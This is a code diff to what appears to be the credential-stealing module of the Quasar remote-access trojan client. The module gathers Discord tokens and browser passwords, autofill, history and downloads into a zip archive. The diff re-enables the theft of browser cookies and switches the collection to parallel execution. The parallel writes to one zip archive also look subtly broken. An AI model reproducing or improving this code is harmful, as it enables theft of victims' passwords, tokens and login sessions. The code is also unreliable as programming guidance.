@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using Quasar.Client.Kematian.Browsers;
+using System.Threading.Tasks;
 
 
 namespace Quasar.Client.Kematian
@@ -23,27 +24,26 @@ namespace Quasar.Client.Kematian
 
                     var methods = new KeyValuePair<Func<string>, string>[]
                     {
-                                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
+                            new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
 
-                                new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
-                                new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
-                                new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
-                                //new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
-                                new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
-
+                            new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
+                            new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
                     };
 
-                    // Process each method one at a time
-                    foreach (var methodPair in methods)
+                    // Process each method in parallel
+                    Parallel.ForEach(methods, methodPair =>
                     {
                         var content = methodPair.Key();
                         var zipEntry = archive.CreateEntry(methodPair.Value);
-                        using (var entryStream = zipEntry.Open())
+                        using (var entryStream = new BufferedStream(zipEntry.Open()))
                         using (var streamWriter = new StreamWriter(entryStream))
                         {
                             streamWriter.Write(content);
                         }
-                    }
+                    });
                 }
                 data = memoryStream.ToArray();
             }
